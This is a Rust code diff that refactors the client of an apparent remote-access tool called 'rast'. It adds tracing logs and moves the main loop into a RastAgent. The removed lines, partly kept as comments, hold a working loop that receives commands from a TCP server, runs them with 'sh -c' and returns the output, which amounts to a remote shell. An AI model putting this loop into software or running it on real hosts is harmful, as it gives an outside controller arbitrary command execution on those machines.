@@ -5,15 +5,20 @@ use rast::{
     protocols::{tcp::*, *},
     settings::*,
 };
+use rast_agent::RastAgent;
+use tracing::{info, instrument};
+use tracing_subscriber::filter::LevelFilter;
 
-#[tokio::main]
+#[tokio::main(flavor = "current_thread")]
 async fn main() -> Result<()> {
-    println!("Hello from client!");
+    tracing_subscriber::fmt()
+        .with_max_level(LevelFilter::INFO)
+        .init();
 
     // TODO: add embedding during compile
     let settings = match Settings::new() {
         Ok(settings) => {
-            println!("{:?}", settings);
+            info!("{:?}", settings);
             settings
         },
         Err(e) => {
@@ -21,29 +26,26 @@ async fn main() -> Result<()> {
         },
     };
 
-    if let Some(conf) = &settings.server.tcp {
-        let mut client = TcpFactory::new_client(conf).await?;
+    let mut agent = RastAgent::with_settings(settings).await?;
+    agent.run().await?;
 
-        loop {
-            let cmd = Arc::get_mut(&mut client).unwrap().recv().await?;
-            let cmd = get_message(cmd).unwrap();
-            let cmd = cmd.trim_end_matches('\0');
+    // let cmd = client.lock().unwrap().recv().await?;
+    // let cmd = get_message(cmd).unwrap();
+    // let cmd = cmd.trim_end_matches('\0');
 
-            let output = Command::new("sh").arg("-c").arg(cmd).output()?;
-            let mut output = String::from_utf8_lossy(&output.stdout).to_string();
+    // let output = Command::new("sh").arg("-c").arg(cmd).output()?;
+    // let mut output =
+    // String::from_utf8_lossy(&output.stdout).to_string();
 
-            if output.is_empty() {
-                output.push('\n');
-            }
+    // if output.is_empty() {
+    //    output.push('\n');
+    //}
 
-            let msg = create_message(&output);
-            Arc::get_mut(&mut client).unwrap().send(msg).await?;
-        }
-    };
-
+    // let msg = create_message(&output);
+    // client.lock().unwrap().send(msg).await?;
     // let msg_s = "Checking in!";
     // client.send(msg_s.to_string()).await?;
-    // println!("Message sent: {}", msg_s);
+    // info!("Message sent: {}", msg_s);
 
     Ok(())
 }
